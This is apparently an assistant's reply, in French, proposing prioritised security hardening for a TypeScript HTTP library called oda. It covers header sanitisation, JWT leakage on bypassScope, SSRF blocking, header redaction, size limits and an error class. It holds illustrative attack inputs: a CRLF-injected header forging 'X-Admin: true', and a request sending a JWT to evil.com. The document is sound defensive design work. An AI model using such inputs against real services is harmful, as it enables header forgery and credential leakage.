Voici les aspects sécurité pertinents pour une lib HTTP, classés par priorité.

---

**1. Sanitisation des headers — Header Injection**

Un header mal sanitisé peut injecter des sauts de ligne et forger de faux headers HTTP.

```typescript
// Attaque classique
apiClient.get("/users", {
  headers: {
    "X-User": "alice\r\nX-Admin: true" // injecte un faux header
  }
});
```

**Fix** — rejeter tout header dont le nom ou la valeur contient `\r`, `\n`, ou `\0` :

```typescript
function sanitizeHeaders(headers: Record<string, string>): Record<string, string> {
  const forbidden = /[\r\n\0]/;
  for (const [key, value] of Object.entries(headers)) {
    if (forbidden.test(key) || forbidden.test(value)) {
      throw new OdaSecurityError(`Invalid header: "${key}"`);
    }
  }
  return headers;
}
```

---

**2. Protection du token JWT — Token Leakage**

Actuellement, si `bypassScope: true` est utilisé avec `auth.jwt`, le token est envoyé vers un domaine externe.

```typescript
// Le token part vers evil.com
apiClient.get("https://evil.com", {
  auth: { jwt: sensitiveToken },
  config: { bypassScope: true },
});
```

**Fix** — bloquer `auth.jwt` sur les requêtes `bypassScope` par défaut, sauf opt-in explicite :

```typescript
config: {
  bypassScope: true,
  allowAuthOnBypass: true, // requis pour envoyer le token hors scope
}
```

---

**3. Validation de l'URL — SSRF (Server-Side Request Forgery)**

Pertinent surtout en contexte Tauri/Node où l'app a accès au réseau local. Une URL contrôlée par l'utilisateur peut cibler des services internes.

```typescript
// L'utilisateur entre une URL dans un formulaire
const userUrl = "http://192.168.1.1/admin"; // routeur local
await apiClient.get(userUrl, { config: { bypassScope: true } });
```

**Fix** — une option `allowPrivateNetworks: false` (défaut) qui bloque les plages IP privées :

```typescript
const client = oda.http.client("https://api.example.com", {
  security: {
    allowPrivateNetworks: false, // bloque 192.168.x.x, 10.x.x.x, localhost…
  },
});
```

---

**4. Sensitive Headers — ne jamais logger `Authorization`**

Si oda intègre du logging ou des intercepteurs à l'avenir, les headers sensibles ne doivent jamais fuiter dans les logs.

```typescript
const SENSITIVE_HEADERS = ["authorization", "cookie", "x-api-key"];

function redactHeaders(headers: Record<string, string>): Record<string, string> {
  return Object.fromEntries(
    Object.entries(headers).map(([k, v]) =>
      SENSITIVE_HEADERS.includes(k.toLowerCase()) ? [k, "***"] : [k, v]
    )
  );
}
```

---

**5. Body size limit**

Éviter d'envoyer ou de recevoir des payloads gigantesques accidentellement.

```typescript
const client = oda.http.client("https://api.example.com", {
  security: {
    maxRequestBodySize:  5 * 1024 * 1024,  // 5MB max en envoi
    maxResponseBodySize: 10 * 1024 * 1024, // 10MB max en réception
  },
});
```

---

**6. `OdaSecurityError` — classe d'erreur dédiée**

Toutes les violations de sécurité méritent leur propre type d'erreur, distinct de `OdaHttpError` ou `OdaScopeError`, pour pouvoir les intercepter et logger spécifiquement.

```typescript
export class OdaSecurityError extends Error {
  constructor(
    public readonly reason: string,
    public readonly url?: string,
  ) {
    super(`[oda:security] ${reason}${url ? ` — ${url}` : ""}`);
    this.name = "OdaSecurityError";
  }
}
```

---

**Résumé par priorité**

| # | Feature | Priorité | Contexte |
|---|---------|----------|---------|
| 1 | Header injection sanitisation | 🔴 haute | tous runtimes |
| 2 | JWT leak sur bypassScope | 🔴 haute | tous runtimes |
| 3 | SSRF / private network block | 🟡 moyenne | Tauri / Node surtout |
| 4 | Sensitive header redaction | 🟡 moyenne | si logging futur |
| 5 | Body size limit | 🟠 basse | cas limites |
| 6 | `OdaSecurityError` | 🔴 haute | socle pour tout le reste |

Je recommande de commencer par **1, 2 et 6** — ce sont les plus impactants et les plus simples à implémenter. On attaque lesquels ?
